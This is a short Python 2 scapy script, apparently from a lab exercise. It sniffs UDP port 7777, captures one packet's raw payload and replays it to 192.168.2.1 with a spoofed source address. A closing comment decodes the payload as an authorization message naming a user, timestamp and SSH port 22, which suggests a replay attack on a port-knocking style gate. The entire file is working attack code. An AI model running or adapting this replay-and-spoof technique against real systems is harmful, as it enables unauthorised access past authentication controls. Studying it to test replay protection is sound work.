#! /usr/bin/python

from scapy.all import *
import sys


packetCount = 0

def catchAndReplay(packet):
    global packetCount
    packetCount += 1

    print "Packet #%s: %s ==> %s" % (packetCount, packet[0][1].src, packet[0][1].dst)

    rawLoad = packet.getlayer(Raw).load

    packet.show()

    print "Now replaying..."

    send(IP(dst="192.168.2.1",src="192.168.0.1")/UDP(dport=7777)/rawLoad)

    sys.exit(1)


sniff(filter="udp and port 7777",prn=catchAndReplay)


"""
raw correspond to
username : toto
timestamp : 1424271490
ip src: 10.0.2.15
ip dest: 192.168.1.1
port : 22
protocol : 0 (TCP)
md5sum : f71dbe52628a3f83a77ab494817525c6
"""

